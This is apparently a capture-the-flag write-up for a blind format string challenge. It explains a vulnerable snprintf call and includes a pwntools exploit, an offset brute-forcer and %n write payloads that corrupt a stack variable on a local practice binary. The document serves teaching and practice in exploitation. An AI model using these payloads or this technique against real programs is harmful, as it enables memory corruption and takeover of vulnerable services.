# Challenge 08: Blind Format String

## Difficulty: Medium

## Vulnerability Type: Blind Format String Write

## Description
This is a "blind" format string vulnerability where the output is not directly shown to us, but we can detect side effects. We need to corrupt a stack variable to trigger the flag.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Blind Format String
```c
snprintf(buffer, sizeof(buffer), buffer);
```

The format string is evaluated but output goes back into `buffer`, not to stdout. However, `%n` still writes!

### Detection Mechanism
```c
int check = 0xbadc0de;
// ...
if (check != 0xbadc0de) {
    printf("🎉 Here's your reward: %s\n", secret_flag);
}
```

We can detect success if we corrupt the `check` variable.

## Exploitation Strategy

### Step 1: Test for Format String
Send `%p` formats and see if the program behaves differently or crashes.

### Step 2: Find Stack Layout
Since we can't see output, we need to:
1. Use `%n` to write values
2. Try different offsets until we corrupt `check`
3. Observe the "Corruption detected" message

### Step 3: Blind Write
```python
# Try writing to different stack positions
for offset in range(1, 30):
    payload = b'%' + str(offset).encode() + b'$n'
    # Send and check if corruption detected
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9008)
else:
    p = process('./challenge')

p.recvuntil(b'=====\n')

# Strategy: Use %n to write to stack positions
# This will corrupt the 'check' variable

# Method 1: Simple %n at various offsets
for i in range(5):
    if i == 0:
        # First attempt - write to nearby stack position
        # The 'check' variable is on the stack
        # Try offset around 10-15
        payload = b'%13$n'  # Adjust based on stack layout
    else:
        # Subsequent attempts (if first fails)
        payload = b'AAAA'

    p.sendlineafter(b'data: ', payload)

    # Check response
    response = p.recvline()
    if b'Corruption' in response:
        # Success!
        flag = p.recvline()
        log.success(flag.decode())
        break

p.close()
```

### Finding the Right Offset
```python
# Brute force approach
def try_offset(offset):
    p = process('./challenge')
    p.recvuntil(b'=====\n')

    payload = f'%{offset}$n'.encode()
    p.sendlineafter(b'data: ', payload)

    response = p.recvall(timeout=1)
    p.close()

    return b'Corruption' in response

# Try offsets 1-30
for i in range(1, 31):
    log.info(f"Trying offset {i}")
    if try_offset(i):
        log.success(f"Found offset: {i}")
        break
```

### Advanced: Specific Value Write
If we need to write a specific value instead of just corruption:
```python
# Write specific value to trigger different checks
target = 0x12345678
payload = f'%{target}c%10$n'.encode()
```

## Automated Detection
- **Blind Format String**: snprintf with format string but no visible output
- **Side Channel**: Corruption detection or program behavior change
- **Write Capability**: %n can modify stack
- **Strategy**: Brute force stack offsets with %n until side effect observed

## Learning Objectives
- Blind vulnerabilities
- Side-channel detection
- Stack variable corruption
- Format string without direct output
- Brute force techniques

## Why "Blind"?
In real-world scenarios, format strings might:
- Write to log files only
- Be in error paths not normally shown
- Have output suppressed
- Be in child processes

Detection requires observing:
- Crashes
- Timing differences
- Error messages
- Behavioral changes
